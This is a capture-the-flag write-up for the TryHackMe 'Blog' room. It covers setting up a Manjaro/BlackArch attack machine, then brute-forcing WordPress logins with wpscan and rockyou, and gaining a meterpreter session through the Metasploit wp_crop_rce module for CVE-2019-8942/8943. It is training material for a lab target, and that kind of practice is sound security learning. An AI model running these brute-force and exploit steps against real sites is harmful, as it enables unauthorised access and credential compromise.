# Blog Writeup

[Blog](https://tryhackme.com/room/blog)

For this instance, let's do something a little different. You never know what system you will be having to deal with or what tools will be available, so instead of relying on the tools and pre-built systems I normally do, I'm going to set up a fresh virtual machine and go through the process until having this room completed.


## Virtual Machine Setup

Just in case we don't have a VM, let's go an get one.


## Download Linux

Since I've never messed with Arch Linux, I'm using Manjaro this time.
[Manjaro Linux](https://manjaro.org/)


## Virtual Machine Setup

If you are running a windows computer that supports hyper-v, running in hypervisor can be significantly more responsive than using virtualbox.
If you support running hyper-v, use that. Otherwise you can use virtualbox.
Gides on setting these up:
* [Manjaro on Hyper-V](/guides/manjaro_on_hyperv)
* [Manjaro on VirtualBox](/guides/manjaro_on_virtualbox)


## Setting up Blackarch

There are a few tools that I always need, so let's set those up.

Once Manjaro is booted up, time to jump into a terminal.

Having a sources directory is useful for all the things you will download through github.
```
mkdir ~/sources
cd /sources
```

BlackArch is a huge collection of tools that we can download, so we can switch our package manager to use BlackArch instead.
```
cd ~/sources
mkdir blackarch && cd blackarch
curl -O https://blackarch.org/strap.sh
```
verify the sum matches.
```
sha1sum strap.sh
```
If that returns anything other than `9c15f5d3d6f3f8ad63a6927ba78ed54f1a52176b`, stop and go to [BlackArch](https://blackarch.org/downloads.html#install-repo) and check if something has been updated. We need to make sure the repo is accurate.

We need to make this script executable, then run it as root.
```
chmod +x strap.sh
sudo ./strap.sh
```

## Tool Setup

We need to have access to git, so time to set it up:
```
sudo pacman -S git
```

I like a nice editor, and VSCode is my favorite flavor.
```
sudo pacman -S code
```

Plain terminals are boring, tmux just adds that little polish that makes things more fun.
```
sudo pacman -S tmux
```

We need nmap for most pentesting and scanning operations, let's get that now.
```
sudo pacman -S nmap
```

My manjaro already has python 3 and pip3 (the python package manager). Verified with entering:
```
which python
which pip
```

For the blog room, I see it's a wordpress instance, so I need wpscan to make things easy.
```
sudo pacman -S wpscan
```
Note - I had to run this command twice to get it to install, my network is a bit unstable.

We need openvpn to connect to TryHackMe's network, thankfully we already have it.
```
which openvpn
```

we might as well pull in hydra and john the ripper.
```
sudo pacman -S hydra
sudo pacman -S john
```

Dirbuster and gobuster are excelent tools to scan webpages with, and enum4linux is a great tool to find easy vulneribilities.
```
sudo pacman -S dirbuster
sudo pacman -S gobuster
sudo pacman -S enum4linux
```

for any SQL injection vulneribility found, sqlmap can do some scary things.
```
sudo pacman -S sqlmap
```

for anything to do with data hidden (or to be hidden) in images, steghide
```
sudo pacman -S steghide
```

Netcat for interacting with communication over networks, and for listening for reverse shells
```
sudo pacman -S openbsd-netcat
```

exploitdb is a great command-line version of [exploit-db](https://www.exploit-db.com/)
```
sudo pacman -S exploitdb
```


## Metasploit

TMetasploit is a powerful tool to have. Let's install it

```
sudo pacman -S metasploit
sudo pacman -S armitage
```

RVM is required for some modules, so set it up now.

```
curl -L get.rvm.io > rvm-install
sudo bash -s stable
bash < ./rvm-install
```

Then for your user (and any other users you want this to be used by), run:
```
usermod -a -G rvm <your username here>
```

Exit your terminal and re-open it, run:
```
type rvm | head -n1
```
and verify that it gives the output "rvm is a function"

We need postgresql for the metasploit DB to work.
```
sudo pacman -S postgresql
sudo -iu postgress
initdb -D /var/lib/postgres/data
systemctl start postgresql.service
systemctl enable postgresql.service
```
Now we need to create a postgresql user.
```
createuser --interactive
```
Let's call our new user "msf".
Now to create the database:
```
createdb msf
```
Don't forget to exit after this step to go back to your regular user.

Load up metasploit console with:
```
msfconsole
```

Connect to the database we just made with:
```
db_connect msf@msf
```

We require connecting everytime we load msfconsole, so we can set up an alias the connection.

Add this to the your ~/.bashrc.
```
echo 'alias msfconsole="msfconsole --quiet -x \"db_connect msf@msf\""' >> ~/.bashrc
```

For more information on RVM, refer to article [Arch Linux Wiki on RVM](https://wiki.archlinux.org/index.php/RVM#Installing_RVM)

## To TryHackMe!

Off to the challenge!
[Blog](https://tryhackme.com/room/blog)

If this is your first time on TryHackMe, make sure you have downloaded your VPN connection file.

Deploy the challenge box and copy the ip, to make things easier, in your console set the IP to a variable for easy use.
(Your IP will likely be different)

![Deployed Box](/images/tryhackme/blog/1.png)

```
export ip=10.10.14.235
```

Now that the IP is ready, let's spin up tmux. it will let us multitask better, as well as monitor as we go to see accesses to local servers and progress of scans.
```
tmux
```

We need to connect to the VPN now. My vpn connection file has been stored in my home directory /vpn, you will need to replace with your own.
```
sudo openvpn ~/vpn/darksheao.ovpn
```

As soon as you get the `Initialization Sequence Completed` message, split your smux pane horizontally.
Control + b, " (push control and b, release, and then push shift + ')
Lets get a little breathing room, resize the new pane with Control + b, arrow up. (Push control b, release b, then push arrow key up repeatedly until the pane is a desirable size)

![Split Personality](/images/tryhackme/blog/2.png)

This is useful because it gives us a nice monitor if the vpn connection fails, and if we need to disconnect or re-connect, we can jump up to the openvpn pane and close the connection (with control+c) and if we re-connect, we will have all our other work in progress still fine.

We might as well pull up the target site and see what's up.


## Post Exploitation Tools

Once we have access to a machine, we can upload some helpful files that can enumerate the victim. Peas and LinEnum are two of my favorite for this.

```
mkdir ~/scripts && cd ~/scripts
git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
git clone https://github.com/rebootuser/LinEnum.git
```


## Information Gathering

First, the challenge room mentions that we have to add blog.thm to our /etc/hosts, so let's do that now.

```
su
echo "$ip blog.thm" >> /etc/hosts
```
Now we can go to blog.thm in our browser and poke around.

![cute](/images/tryhackme/blog/3.png)

Since this is a wordpress site, let's fire up wpscan. Make sure you are in a writable directory, I recommend making a directory to store any information about this hack as you go.

```
mkdir /tmp/blog && cd /tmp/blog
wpscan -v -o wpscan.log -e --url blog.thm
```

this might take a minute to run. After the command is done, start checking out the log it created.

There are a few interesting finds in this log.

```

```

So, we have a couple usernames, we have the readme.html still accessable, an out of date theme, and a couple usernames.

We need a wordlist to attempt breaking the password, this doesn't seem like the site of someone who is security conscious after all.

```
mkdir ~/lists && cd ~/lists
curl -L https://github.com/praetorian-code/Hob0Rules/raw/master/wordlists/rockyou.txt.gz --output rockyou.txt.gz
gzip -d rockyou.txt.gz

curl -L https://github.com/trustedsec/social-engineer-toolkit/files/698569/fasttrack.txt --output fasttrack.txt
```

Fasttrack is a smaller list, so we can try that first.

```
wpscan -v --url blog.thm -U 'kwheel,bjoel' -P ~/lists/fasttrack.txt
```

Fasttrack didn't turn anything up, so we can try again with rockyou in the background while we research.

```
wpscan -v --url blog.thm -U 'kwheel,bjoel' -P ~/lists/rockyou.txt
```
While doing other research, this already turned up a password (redacted so you can find it yourself)
```
[SUCCESS] - kwheel / ---------
```

While this starts out, I split my terminal verticially with control + b, %

I also pull up [Exploit-db](https://www.exploit-db.com) and search for "wordpress 5.0".

Interestingly I see 2 exploits for code execution here.

![exploits exploits exploits](/images/tryhackme/blog/4.png)

Looks like there is one that actually has a metasploit module too.
The CVE's of the exploit I'm gonna try are these:

```
[ 'CVE', '2019-8942' ],
[ 'CVE', '2019-8943' ],
```

## Initial Access

Boot up metasploit
```
msfconsole
```

We need to search for our exploit.
```
search wordpress
```

There are plenty of results, and scrolling through a tmux session isn't straightforward. To go into "select" mode, where the cursor can scroll around a tmux pane, use the shortcut control + b, [
And then when you are done, push q to go back to normal mode.

The exploit we want is `exploit/multi/http/wp_crop_rce`
```
use exploit/multi/http/wp_crop_rce
```

Then check the options to see what settings we can set.
```
options
```

![our options](/images/tryhackme/blog/5.png)

We know a username, kwheel, and her password.

Set them into the options.
```
set username kwheel
set password --------- (redacted so you can find it yourself)
```

We need to enter set rhosts to the IP of our target.

```
set rhosts 10.10.10.10 <replace with the IP thm gives you>
```

Now we just need to execute our attack!

```

And we can run commands on the server! We've got our access. Now on to further exploiting!


## Flag Hunting

We need to get some info on our system.

```
meterpreter > sysinfo
Computer    : blog
OS          : Linux blog 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64

```
